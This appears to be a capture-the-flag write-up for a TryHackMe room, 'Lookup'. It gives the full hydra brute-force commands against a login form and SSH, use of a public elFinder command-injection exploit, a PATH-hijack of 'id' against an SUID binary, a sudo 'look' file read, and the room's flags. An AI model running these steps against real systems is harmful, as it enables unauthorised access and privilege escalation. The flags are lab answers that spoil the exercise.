
[[TryHackMe]] Room

**Date**: 17/01/25
**Target IP**: 10.10.88.15

---

## **Initial Scanning**

**[[Nmap]] Results:**

- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

---
## **Exploration and Enumeration**

Login Page discovered at **Port 80**. Wrong password alert allows user enumeration leading to discovery that ==`admin`== user exists.

**DirSearch Results**:

```bash
Target: http://lookup.thm/

[11:47:15] Starting: 
[11:47:23] 403 -  275B  - /.ht_wsr.txt
[11:47:23] 403 -  275B  - /.htaccess.bak1
[11:47:23] 403 -  275B  - /.htaccess.sample
[11:47:23] 403 -  275B  - /.htaccess.orig
[11:47:23] 403 -  275B  - /.htaccess.save
[11:47:23] 403 -  275B  - /.htaccess_sc
[11:47:23] 403 -  275B  - /.htaccess_extra
[11:47:23] 403 -  275B  - /.htaccess_orig
[11:47:23] 403 -  275B  - /.htaccessBAK
[11:47:23] 403 -  275B  - /.htaccessOLD
[11:47:23] 403 -  275B  - /.htm
[11:47:23] 403 -  275B  - /.htaccessOLD2
[11:47:23] 403 -  275B  - /.html
[11:47:23] 403 -  275B  - /.htpasswd_test
[11:47:23] 403 -  275B  - /.httr-oauth
[11:47:23] 403 -  275B  - /.htpasswds
[11:47:24] 403 -  275B  - /.php
[11:47:47] 200 -    1B  - /login.php
[11:47:58] 403 -  275B  - /server-status/
[11:47:58] 403 -  275B  - /server-status
```

Ran [[hydra]] to brute-force the login page using the username admin : 

```bash
❯ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt lookup.thm -s 5000 http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password." -I -vV -c 3
```

Brute-forcing appears successful : 

```
[80][http-post-form] host: lookup.thm   login: admin   password: password123
```

However, this is not the correct password for the admin user. Rather when using this combination despite using an existing username, we obtain the message : `Wrong username or password. Please try again. Redirecting in 3 seconds.` 

This may be indicative that the password exists in the database but is for another user. We thus iterate through a username list with the password obtained: 

```bash
❯ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Please try again." -I -vV -t 30
```

We obtain the following:

```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

---
## **Exploitation**

On logging in successfully, we obtain an elFinder file management page. The files seem to be full of random text.

`credentials.txt` possesses the credentials `think : nopassword`.

Inspecting the version of elFinder we discover it is **2.1.47**. There exists a known exploit which can be used to gain a shell through command injection. https://www.exploit-db.com/exploits/46481

We use this and gain a shell as **www-data** :

```bash
❯ python2.7 exploit.py http://files.lookup.thm/elFinder
```

We can [[Shell Upgrade]] if necessary.



---
## **Post-Exploitation**

Running linpeas gives the following :

```bash
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
```

Running this binary outputs the following :

```bash
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

Running strings on this file allows us to deduce that this is some sort of password manager script that runs the `id` command to check who the current use is.  This can be vulnerable as it does not seem to be running `/bin/id`, meaning we can create our own `id` script and fool it into running it.

This is done as follows : 

```bash
www-data@lookup:/tmp$ export PATH="/tmp:$PATH"

www-data@lookup:/tmp$ echo '#!/bin/bash' > /tmp/id

www-data@lookup:/tmp$ echo "echo 'uid=1000(think) gid=1000(think) groups=1000(think)'" >> /tmp/id

www-data@lookup:/tmp$ chmod +x id

www-data@lookup:/tmp$ /usr/sbin/pwm
```

We obtain a list of passwords used by the think user.

We can use these to brute-force SSH into said user with [[hydra]] :

```bash
❯ hydra -l think -P ./jose_passwords lookup.thm ssh -t 4

[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)

```

We thus obtain the **user flag** ( /home/think/user.txt ) :
**38375fb4dd8baa2b2039ac03d92b820e**

---
## **Escalation**

```
think@lookup:~$ sudo -l

User think may run the following commands on lookup:
(ALL) /usr/bin/look
```

think can run `/usr/bin/look` as sudo. We can thus refer to [GTFOBins](https://gtfobins.github.io/) and gain privileged access to the `/root/root.txt` file to read it as follows : 

```bash
think@lookup:~$ sudo look -bdf "" /root/root.txt
```

We thus obtain the Root Flag :
**5a285a9f257e45c68bb6c9f9f57d18e8**

---
## **Summary**

- Login Page credentials : **jose:password123**
- elFinder 2.1.47 command injection exploit (https://www.exploit-db.com/exploits/46481)
- Create malicious `id` binary and exploit `/usr/sbin/pwm`
- think user SSH password : **josemario.AKA(think)**
- User Flag ( /home/think/user.txt ) : **38375fb4dd8baa2b2039ac03d92b820e**
- Exploit /usr/bin/look sudo access (  [GTFOBins](https://gtfobins.github.io/))
- Root Flag ( /root/root.txt ) : **5a285a9f257e45c68bb6c9f9f57d18e8**